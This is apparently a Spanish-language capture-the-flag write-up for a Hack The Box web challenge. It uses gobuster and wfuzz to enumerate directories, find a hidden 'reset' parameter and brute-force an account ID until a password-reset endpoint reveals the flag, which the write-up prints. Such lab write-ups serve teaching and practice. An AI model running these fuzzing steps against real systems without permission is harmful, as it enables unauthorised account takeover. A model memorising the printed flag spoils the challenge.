# Fuzzy

*We have gained access to some infrastructure which we believe is connected to the internal network of our target. We need you to help obtain the administrator password for the website they are currently developing.*

Nos dan una ip que añadiremos al /etc/hosts como docker.htb con el objetivo

Bien el nombre del reto es una gran pista perse, empezemos con un pequeño fuzz de directorios 
```
gobuster -u http://docker.htb:32155 -w /usr/share/dirb/wordlists/big.txt -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://docker.htb:32155/
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2020/12/30 02:55:44 Starting gobuster
=====================================================
/api (Status: 301)
/css (Status: 301)
/js (Status: 301)
=====================================================
2020/12/30 02:56:16 Finished
=====================================================

```
Bien este /api parece sospechoso, fuzzeemos de nuevo pero esta vez en busca de archivos php

```
gobuster -u http://docker.htb:32155/api -w /usr/share/dirb/wordlists/big.txt -t 90 -x php,py,html,pl

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://docker.htb:32155/api/
[+] Threads      : 90
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : pl,php,py,html
[+] Timeout      : 10s
=====================================================
2020/12/30 03:17:49 Starting gobuster
=====================================================
/action.php (Status: 200)
=====================================================
2020/12/30 03:18:49 Finished
=====================================================
```
Bien accedemos a este archivo y nos da un error:
```
Error: Parameter not set
```
Parece que hay que fuzzear algún tipo de parametro, para esta tarea usaremos wfuzz en lugar de gobuster, primero ajustaremos la longitud de la respuesta que nos dan (24) para encontrar distintas , luego seeccionamos diccionario y ponemos el objetivo
```
wfuzz --hh=24 -w /usr/share/dirb/wordlists/big.txt  http://docker.htb:32155/api/action.php?FUZZ=uwu
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://docker.htb:32155/api/action.php?FUZZ=uwu
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                           
===================================================================

000015356:   200        0 L      5 W      27 Ch       "reset"                                                                           
```
Bien parece que tenmos premio:
```
Error: Account ID not found
```
Bien toca fuzzear la ID de la cuenta, no sabemos que tipo de patron siguen para generarlas asi que podemos ir probando diccionarios hasta que la encontremos:, como antes ajustaremos la longitud de la respuesta y veremos que sucede
```
wfuzz --hh=27 -w /usr/share/dirb/wordlists/big.txt http://docker.htb:32155/api/action.php?reset=FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://docker.htb:32155/api/action.php?reset=FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000318:   200        0 L      10 W     74 Ch       "20"     
```
Tenemos premio:
```
You successfully reset your password! Please use HTB{h0t_fuzz3r} to login.
```
Flag: **HTB{h0t_fuzz3r}**
